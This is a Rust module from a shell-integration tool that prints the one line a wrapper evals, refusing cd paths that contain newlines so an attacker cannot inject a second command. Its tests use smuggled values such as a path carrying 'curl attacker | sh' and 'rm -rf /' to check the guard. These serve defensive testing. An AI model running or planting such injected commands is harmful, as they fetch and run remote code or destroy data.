//! The single stdout write point for the shell-eval contract.
//!
//! stdout is consumed verbatim by the shell wrapper (`eval "$(command vibe ...)"`),
//! so exactly one place writes it. An [`Outcome`] carries either a `cd_path`
//! (rendered for the caller's [`EvalDialect`] — POSIX `cd '<escaped>'` unless a
//! new-style wrapper passed `--eval-dialect`) or verbatim `stdout` text (the
//! `shell-setup` wrapper/completion). These are mutually exclusive by
//! construction.

// Why not obey the workspace-wide `clippy::print_stdout` deny here: this module
// IS the one sanctioned exception. The eval contract
// (docs/specifications/eval-contract.md §4.1) requires exactly one stdout write
// point so the newline guard below cannot be bypassed; the lint exists to make
// every OTHER stdout write a build failure.
#![allow(clippy::print_stdout)]

use vibe_core::commands::Outcome;
use vibe_core::shell::{format_cd_for, EvalDialect};
use vibe_core::VibeError;

/// Write an outcome's stdout payload (if any) to real stdout.
///
/// Security guard: if `cd_path` contains a `\n` or `\r`, refuse to print and
/// return an error instead. A newline would split the single `cd` line the
/// shell evals, letting an attacker-controlled path inject a second command.
/// The guard runs BEFORE dialect dispatch, so it covers every dialect —
/// including the nushell sentinel form, which carries the path unquoted and is
/// delimited only by the line break.
pub fn write_outcome(outcome: &Outcome, dialect: EvalDialect) -> Result<(), VibeError> {
    // `cd_path` and `stdout` are mutually exclusive by construction; assert it in
    // debug builds so a future `Outcome` constructor that sets both is caught
    // (the branch order below would otherwise silently drop `stdout`).
    debug_assert!(
        !(outcome.cd_path.is_some() && outcome.stdout.is_some()),
        "Outcome must not set both cd_path and stdout"
    );

    if let Some(path) = &outcome.cd_path {
        let has_newline = path.contains('\n') || path.contains('\r');
        if has_newline {
            return Err(VibeError::Worktree(
                "refusing to emit a cd path containing a newline".to_string(),
            ));
        }
        println!("{}", format_cd_for(dialect, path));
        return Ok(());
    }

    if let Some(text) = &outcome.stdout {
        // Verbatim: the text already carries its own trailing newline(s).
        print!("{text}");
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn rejects_cd_path_with_newline() {
        let outcome = Outcome::cd("/tmp/evil\ncurl attacker | sh");
        assert!(write_outcome(&outcome, EvalDialect::Posix).is_err());
    }

    #[test]
    fn rejects_cd_path_with_carriage_return() {
        let outcome = Outcome::cd("/tmp/evil\rsomething");
        assert!(write_outcome(&outcome, EvalDialect::Posix).is_err());
    }

    #[test]
    fn rejects_newline_cd_path_under_every_dialect() {
        for dialect in [
            EvalDialect::Posix,
            EvalDialect::Nushell,
            EvalDialect::Powershell,
        ] {
            assert!(
                write_outcome(&Outcome::cd("/tmp/evil\nrm -rf /"), dialect).is_err(),
                "newline accepted under {dialect:?}"
            );
            assert!(
                write_outcome(&Outcome::cd("/tmp/evil\rrm -rf /"), dialect).is_err(),
                "carriage return accepted under {dialect:?}"
            );
        }
    }

    #[test]
    fn accepts_normal_cd_path() {
        // A clean path prints without error (output captured by the test harness).
        let outcome = Outcome::cd("/tmp/repo");
        assert!(write_outcome(&outcome, EvalDialect::Posix).is_ok());
    }

    #[test]
    fn nushell_dialect_emits_the_sentinel_and_raw_path() {
        // The formatting itself is asserted in vibe-core's shell tests; here we
        // confirm write_outcome routes the dialect through instead of hardcoding
        // POSIX.
        let path = "/tmp/it's a repo";
        assert_eq!(
            vibe_core::shell::format_cd_for(EvalDialect::Nushell, path),
            format!("{}{path}", vibe_core::shell::NU_CD_SENTINEL)
        );
        assert!(write_outcome(&Outcome::cd(path), EvalDialect::Nushell).is_ok());
    }

    #[test]
    fn powershell_dialect_emits_a_set_location_line() {
        let path = "C:\\repos\\wt[1]";
        assert_eq!(
            vibe_core::shell::format_cd_for(EvalDialect::Powershell, path),
            "Set-Location -LiteralPath 'C:\\repos\\wt[1]'"
        );
        assert!(write_outcome(&Outcome::cd(path), EvalDialect::Powershell).is_ok());
    }

    #[test]
    fn none_outcome_is_ok() {
        assert!(write_outcome(&Outcome::none(), EvalDialect::Posix).is_ok());
    }

    #[test]
    fn stdout_outcome_is_ok() {
        assert!(write_outcome(&Outcome::stdout("vibe() { :; }\n"), EvalDialect::Posix).is_ok());
    }
}
